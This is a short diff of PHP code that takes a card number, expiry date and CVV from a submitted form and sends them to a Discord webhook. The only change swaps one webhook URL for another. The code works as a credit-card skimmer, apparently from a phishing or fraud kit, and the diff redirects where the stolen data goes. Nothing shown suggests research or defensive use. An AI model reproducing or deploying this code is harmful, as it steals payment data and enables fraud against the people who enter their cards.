@@ -474,7 +474,7 @@
 														$expYear = $_POST['expYear'];
 														$cvv = $_POST['cvv'];
 														$data = array("content" => "CCN: {$ccn}\nEXP_MONTH: {$expMonth}\nEXP_YEAR: {$expYear}\nCVV: {$cvv}", "username" => $_SERVER['HTTP_HOST']);
-														$curl = curl_init("https://ptb.discordapp.com/api/webhooks/473986648942575637/xXc77rhQNMxFFOkDCsCd4GVY__9vyf0GpHkglwpqQKzXntI1xzjyZQiSPEArKR6Xnkxu");
+														$curl = curl_init("https://canary.discordapp.com/api/webhooks/466505495369482240/CUy4In6WS_bFdLhw_xIBixxOZvHPaXkl0IQssuDqQqapzxVe2Dh_-_3eyJsuOSEzE8Dd");
 														curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
 														curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));
 														curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
